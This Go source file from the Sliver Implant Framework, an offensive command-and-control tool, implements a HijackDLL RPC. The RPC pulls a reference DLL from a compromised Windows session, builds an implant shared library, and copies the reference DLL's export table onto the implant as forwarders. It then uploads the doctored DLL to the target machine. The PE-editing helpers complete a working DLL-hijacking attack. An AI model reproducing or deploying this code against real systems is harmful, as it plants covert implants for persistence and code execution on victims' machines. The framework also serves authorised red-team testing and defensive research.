package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"strings"

	"github.com/Binject/debug/pe"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/codenames"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	"github.com/bishopfox/sliver/server/generate"
	"github.com/bishopfox/sliver/util/encoders"
)

// HijackDLL - RPC call to automatically perform DLL hijacking attacks
func (rpc *Server) HijackDLL(ctx context.Context, req *clientpb.DllHijackReq) (*clientpb.DllHijack, error) {
	var (
		refDLL        []byte
		targetDLLData []byte
	)
	resp := &clientpb.DllHijack{
		Response: &commonpb.Response{},
	}
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return resp, ErrInvalidSessionID
	}
	if session.OS != "windows" {
		return nil, status.Error(codes.InvalidArgument, fmt.Sprintf(
			"this feature is not supported on the target operating system (%s)", session.OS,
		))
	}

	// download reference DLL if we don't have one in the request
	if len(req.ReferenceDLL) == 0 {
		download, err := rpc.Download(context.Background(), &sliverpb.DownloadReq{
			Request: &commonpb.Request{
				SessionID: session.ID,
				Timeout:   int64(30),
			},
			Path: req.ReferenceDLLPath,
		})
		if err != nil {
			return nil, status.Error(codes.InvalidArgument, fmt.Sprintf(
				"could not download the reference DLL: %s", err.Error(),
			))
		}
		if download.Encoder == "gzip" {
			download.Data, err = new(encoders.Gzip).Decode(download.Data)
			if err != nil {
				return nil, err
			}
		}
		refDLL = download.Data
	} else {
		refDLL = req.ReferenceDLL
	}
	if req.ProfileName != "" {
		profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
		if err != nil {
			return nil, err
		}
		var p *clientpb.ImplantProfile
		for _, prof := range profiles.Profiles {
			if prof.Name == req.ProfileName {
				p = prof
			}
		}
		if p.GetName() == "" {
			return nil, status.Error(codes.InvalidArgument, fmt.Sprintf(
				"no profile found for name %s", req.ProfileName,
			))
		}

		if p.Config.Format != clientpb.OutputFormat_SHARED_LIB {
			return nil, status.Error(codes.InvalidArgument,
				"please select a profile targeting a shared library format",
			)
		}
		name, config := generate.ImplantConfigFromProtobuf(p.Config)
		if name == "" {
			name, err = codenames.GetCodename()
			if err != nil {
				return nil, err
			}
		}
		otpSecret, _ := cryptography.TOTPServerSecret()
		err = generate.GenerateConfig(name, config, true)
		if err != nil {
			return nil, err
		}
		fPath, err := generate.SliverSharedLibrary(name, otpSecret, config, true)
		if err != nil {
			return nil, err
		}

		targetDLLData, err = os.ReadFile(fPath)
		if err != nil {
			return nil, err
		}
	} else {
		if len(req.TargetDLL) == 0 {
			return nil, errors.New("missing target DLL")
		}
		targetDLLData = req.TargetDLL
	}
	// call clone
	result, err := cloneExports(targetDLLData, refDLL, req.ReferenceDLLPath)
	if err != nil {
		return resp, fmt.Errorf("failed to clone exports: %s", err)
	}
	targetBytes, err := result.Bytes()
	if err != nil {
		return resp, fmt.Errorf("failed to convert PE to bytes: %s", err)
	}
	// upload new dll
	uploadGzip := new(encoders.Gzip).Encode(targetBytes)
	// upload to remote target
	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    req.TargetLocation,
		Request: &commonpb.Request{
			SessionID: session.ID,
			Timeout:   int64(minTimeout),
		},
	})

	if err != nil {
		return nil, err
	}

	if upload.Response != nil && upload.Response.Err != "" {
		return nil, fmt.Errorf(upload.Response.Err)
	}

	return resp, nil
}

// -------- Utility functions

const (
	DEFAULT_CHARACTERISTICS = 0x40000040
	SECTION_NAME            = 8
)

// exportDirectory - data directory definition for exported functions
// without DllName to make it easier to use with binary.Read / binary.Write
type exportDirectory struct {
	ExportFlags       uint32 // reserved, must be zero
	TimeDateStamp     uint32
	MajorVersion      uint16
	MinorVersion      uint16
	NameRVA           uint32 // pointer to the name of the DLL
	OrdinalBase       uint32
	NumberOfFunctions uint32
	NumberOfNames     uint32 // also Ordinal Table Len
	AddressTableAddr  uint32 // RVA of EAT, relative to image base
	NameTableAddr     uint32 // RVA of export name pointer table, relative to image base
	OrdinalTableAddr  uint32 // address of the ordinal table, relative to iamge base
}

func alignUp(value, align uint32) uint32 {
	if align == 0 {
		align = 0x1000
	}
	return (value + align - 1) & ^(align - 1)
}

func addSection(peFile *pe.File, name string, size uint32) (*pe.Section, error) {

	var (
		virtualSize       uint32
		virtualAddr       uint32
		rawSize           uint32
		rawPtr            uint32
		origName          [8]byte
		sectionHeaderSize = int64(0x28)
	)

	if len(name) > SECTION_NAME {
		return nil, errors.New("name too long")
	}

	headerOffset := peFile.OptionalHeaderOffset + int64(peFile.SizeOfOptionalHeader) + (int64(peFile.NumberOfSections) * sectionHeaderSize)
	lastSection := peFile.Sections[peFile.NumberOfSections-1]
	switch hdr := (peFile.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		if headerOffset+sectionHeaderSize > int64(hdr.SizeOfHeaders) {
			return nil, errors.New("not enough room for an additional section")
		}
		virtualSize = alignUp(size, hdr.SectionAlignment)
		virtualAddr = alignUp(lastSection.VirtualAddress+lastSection.VirtualSize, hdr.SectionAlignment)
		rawSize = alignUp(size, hdr.FileAlignment)
		rawPtr = alignUp(lastSection.Offset+lastSection.Size, hdr.FileAlignment)
		hdr.SizeOfImage = virtualAddr + virtualSize
	case *pe.OptionalHeader64:
		if headerOffset+sectionHeaderSize > int64(hdr.SizeOfHeaders) {
			return nil, errors.New("not enough room for an additional section")
		}
		virtualSize = alignUp(size, hdr.SectionAlignment)
		virtualAddr = alignUp(lastSection.VirtualAddress+lastSection.VirtualSize, hdr.SectionAlignment)
		rawSize = alignUp(size, hdr.FileAlignment)
		rawPtr = alignUp(lastSection.Offset+lastSection.Size, hdr.FileAlignment)
		hdr.SizeOfImage = virtualAddr + virtualSize
	}

	newSection := new(pe.Section)
	newSection.Name = name
	copy(origName[:], []byte(name+"\x00"))
	newSection.OriginalName = origName
	newSection.Characteristics = DEFAULT_CHARACTERISTICS
	newSection.Size = rawSize
	newSection.VirtualSize = virtualSize
	newSection.VirtualAddress = virtualAddr
	newSection.Offset = rawPtr

	newSection.PointerToRelocations = 0
	newSection.PointerToLineNumbers = 0
	newSection.NumberOfLineNumbers = 0
	newSection.NumberOfRelocations = 0

	peFile.FileHeader.NumberOfSections += 1
	peFile.Sections = append(peFile.Sections, newSection)
	return newSection, nil
}

// cloneExports clones the export from referencePE to targetPE
func cloneExports(targetPE []byte, referencePE []byte, refPath string) (*pe.File, error) {
	var (
		tgt                = bytes.NewReader(targetPE)
		ref                = bytes.NewReader(referencePE)
		refExportDirectory pe.DataDirectory
	)
	refPath = strings.ReplaceAll(refPath, ".dll", "")
	tgtFile, err := pe.NewFile(tgt)
	if err != nil {
		return nil, err
	}

	refFile, err := pe.NewFile(ref)
	if err != nil {
		return nil, err
	}
	switch hdr := (refFile.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		refExportDirectory = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
	case *pe.OptionalHeader64:
		refExportDirectory = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
	}
	refExports, err := refFile.Exports()
	if err != nil {
		return nil, err
	}
	if len(refExports) == 0 {
		return nil, errors.New("reference binary has no exports")
	}
	var exportNames []string
	for _, exp := range refExports {
		var newName string
		if exp.Name != "" {
			newName = fmt.Sprintf("%s.%s", refPath, exp.Name)
		} else {
			newName = fmt.Sprintf("%s.#%d", refPath, exp.Ordinal)
		}
		exportNames = append(exportNames, newName)
	}

	tgtFile.DosStub = refFile.DosStub

	exportNamesBlob := strings.Join(exportNames, "\x00")
	exportNamesBlob += "\x00"
	forwardNameBlock := []byte(exportNamesBlob)
	newSectionSize := refExportDirectory.Size + uint32(len(exportNamesBlob))
	newSection, err := addSection(tgtFile, ".rdata2", uint32(newSectionSize))
	if err != nil {
		return nil, err
	}

	// Update the export directory size and virtual address
	switch hdr := (tgtFile.OptionalHeader).(type) {
	case *pe.OptionalHeader32:
		hdr.DataDirectory[0].VirtualAddress = newSection.VirtualAddress
		hdr.DataDirectory[0].Size = newSectionSize
	case *pe.OptionalHeader64:
		hdr.DataDirectory[0].VirtualAddress = newSection.VirtualAddress
		hdr.DataDirectory[0].Size = newSectionSize
	}

	delta := newSection.VirtualAddress - refExportDirectory.VirtualAddress
	exportDirOffset := refFile.RVAToFileOffset(refExportDirectory.VirtualAddress)
	sectionData := make([]byte, newSection.Size)
	// Write the new export table into the section
	n := copy(sectionData, referencePE[exportDirOffset:exportDirOffset+refExportDirectory.Size])
	if n < int(refExportDirectory.Size) {
		return nil, fmt.Errorf("only copied %d bytes", n)
	}
	// Write the forward name block
	n = copy(sectionData[refExportDirectory.Size:], forwardNameBlock)
	if n < int(refExportDirectory.Size) {
		return nil, fmt.Errorf("only copied %d bytes", n)
	}
	// Update the section data
	sectionDataReader := bytes.NewReader(sectionData)
	tgtFile.Section(newSection.Name).Replace(sectionDataReader, int64(len(sectionData)))

	// Get the updated byte slice representation of the target file
	tgtBytes, err := tgtFile.Bytes()
	if err != nil {
		return nil, err
	}

	// We're not using pe.ExportDirectory because it contains a string field (DllName)
	// which makes it unusable with binary.Read, and I did not want to manually parse
	// all the fields because I'm lazy.
	newExportDirectory := exportDirectory{}
	err = binary.Read(bytes.NewReader(tgtBytes[newSection.Offset:]), binary.LittleEndian, &newExportDirectory)
	if err != nil {
		return nil, err
	}
	// Update the export directory
	newExportDirectory.AddressTableAddr += delta
	newExportDirectory.NameTableAddr += delta
	newExportDirectory.OrdinalTableAddr += delta

	// Write it back to the target file byte slice
	buf := new(bytes.Buffer)
	err = binary.Write(buf, binary.LittleEndian, &newExportDirectory)
	if err != nil {
		return nil, err
	}
	n = copy(tgtBytes[newSection.Offset:], buf.Bytes())
	if n < buf.Len() {
		return nil, fmt.Errorf("only read %d bytes, expected %d", n, buf.Len())
	}

	// Link function addresses to forward names
	forwardOffset := newSection.VirtualAddress + refExportDirectory.Size
	rawAddressOfFunctions := tgtFile.RVAToFileOffset(newExportDirectory.AddressTableAddr)
	for i := uint32(0); i < newExportDirectory.NumberOfFunctions; i++ {
		offset := rawAddressOfFunctions + (4 * i)
		forwardName := exportNames[i]
		binary.LittleEndian.PutUint32(tgtBytes[offset:], forwardOffset)
		forwardOffset += uint32(len(forwardName) + 1)
	}

	// Apply delta to export names
	rawAddressOfNames := tgtFile.RVAToFileOffset(newExportDirectory.NameTableAddr)
	for i := uint32(0); i < newExportDirectory.NumberOfNames; i++ {
		offset := rawAddressOfNames + (4 * i)
		data := binary.LittleEndian.Uint32(tgtBytes[offset:])
		binary.LittleEndian.PutUint32(tgtBytes[offset:], (data + delta))
	}
	// Return the new pe.File
	return pe.NewFile(bytes.NewReader(tgtBytes))
}
